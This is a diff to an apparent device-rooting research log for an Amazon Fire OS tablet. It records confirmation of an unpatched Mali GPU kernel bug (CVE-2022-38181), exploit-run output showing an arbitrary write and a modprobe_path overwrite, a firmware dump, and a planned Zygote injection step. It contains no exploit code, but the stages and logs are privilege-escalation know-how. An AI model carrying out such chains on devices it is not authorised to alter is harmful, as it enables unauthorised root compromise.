@@ -36,6 +36,102 @@ all `Permission denied` (the visible node names — `js_ctx_scheduling_mode`,
 down `rXXpY` needs `KBASE_IOCTL_VERSION_CHECK`, i.e. compiled code. The exploit
 does that itself, so this isn't blocking.
 
+## LIVE RESULTS (2026-08-21)
+
+### The vulnerability is present
+
+`jit_trigger` on this device:
+
+```
+[*] UAPI 11.11
+[+] FLAGS_CHANGE(DONT_NEED) accepted on JIT region
+[*] applying memory pressure, watching MEM_QUERY...
+[+] round 23: MEM_QUERY lost the region (Invalid argument)
+[+] BUG CONFIRMED: JIT region reclaimed while jit_alloc[] references it
+```
+
+**CVE-2022-38181 is unpatched.** The hypothesis held: Amazon fixed it in Fire OS
+7.3.2.9 (June 2024), this kernel was built 2023-12-05, and the PS74xx internal
+train never received the backport. UAPI **11.11** matches the reference device
+exactly (kbase r14p0).
+
+### Correction: aarch64 binaries *do* run here
+
+Worth recording because it nearly derailed this. The reference exploit is
+**ELF 64-bit aarch64**, and this device looks 32-bit everywhere you check —
+`ro.product.cpu.abilist` is `armeabi-v7a,armeabi`, `abilist64` is empty,
+`ro.zygote=zygote32`, `uname -m` reports `armv8l`, and there is no
+`/system/bin/linker64` or `/system/lib64`.
+
+I concluded the binaries couldn't run. **That was wrong.** Testing it directly:
+
+```
+$ /data/local/tmp/gpu_test
+[*] init ok
+[*] submitting WRITE_VALUE job, jc=0x7f9f7a9000 target=0x7f9f7a8000
+[*] target content = 0x4141414142424242 (expect 0x4141414142424242)
+```
+
+The **kernel is arm64 and supports AArch64 EL0**; only the Android userspace is
+32-bit-only. Statically-linked 64-bit binaries execute fine, with genuine 64-bit
+addresses. So the "32-bit userspace kills every arm64 PoC" concern below applies
+to *Android apps*, not to static binaries pushed to `/data/local/tmp`.
+
+`/dev/mali0` is `crw-rw-rw-`, reachable by the `shell` user.
+
+### Exploit progress — primitives work, chain doesn't complete yet
+
+`exploit_trona 0x40080000 root`, no kernel panic, and it gets a long way:
+
+```
+[A] hijack write evt=0x1
+[A] entry 256 after = 0x41910443 -> *** ALIAS WRITE LANDS ***
+[B4] mimic flags=0x400000000000c1 best variant=0
+[R] init_task @0x417ad400 cred pair -> 0xffffff80097b65d8
+[C] live modprobe_path at 0x417b51c8
+[C] modprobe DRAM after = '/data/local/tmp/x'
+[C] trigger 0..5: nothing (enforce=1)
+[E3] hunting selinux .bss via changing counters... not found (enforce=1)
+[D] === CRED ATTACK === [-] calibration failed
+```
+
+So on **our** build: the arbitrary-write primitive lands, the PTE format mimic
+works, runtime anchor discovery finds a real `init_task` and a live
+`modprobe_path`, and the modprobe_path overwrite **succeeds**. What fails is
+(a) `selinux_enforcing` is not located by the avc-counter hunt, so SELinux stays
+enforcing and the modprobe trigger never fires, and (b) the cred-attack
+calibration fails.
+
+Note the anchors differ from the reference device's (`init_task 0x417ad400`,
+`modprobe_path 0x417b51c8` here), which is expected — different kernel build.
+The `[R]` L2-borrow read reports `4/512 mismatch (READ BROKEN)`, which is likely
+why the SELinux hunt can't anchor.
+
+**Status: grinding.** The documented failure mode is a ~50% race loss per
+attempt, so repeated attempts are the intended workflow. If it converges,
+root follows; if the `[R]` read stays broken, the SELinux stage needs porting to
+this build rather than more attempts.
+
+## Firmware dump — done (unprivileged)
+
+1.3 GB pulled over plain adb with no root, into `fw/` (gitignored). Hashed
+inventory of the Amazon-specific artifacts is in
+[`dumps/fw-manifest.txt`](dumps/fw-manifest.txt).
+
+| tree | size |
+| --- | --- |
+| `/system/lib` | 705 M |
+| `/system/framework` | 208 M (incl. `fosframework.jar` + `boot-fosframework.oat/.art/.vdex`) |
+| `/system/priv-app` | 161 M (incl. `RaftSystemUI.apk`, `Shipmode`, `ArcusListener`) |
+| `/system/app` | 148 M |
+| `/vendor` | 90 M (incl. the `fireos.hardware.*` HALs) |
+| `/system/bin` | 3.4 M |
+| `/system/etc` | 1000 K |
+
+That covers everything readable without privileges. **Still needs root:** the
+raw partitions — `lk` (`mmcblk0p5`), preloader (boot0), IDME (boot2), `boot`,
+`recovery`, and `keys`/`kb`/`dkb`.
+
 ## Step 1 — CVE-2024-31317 "SYSTEM USER" — do this first
 
 A single ADB command. Zygote command injection via
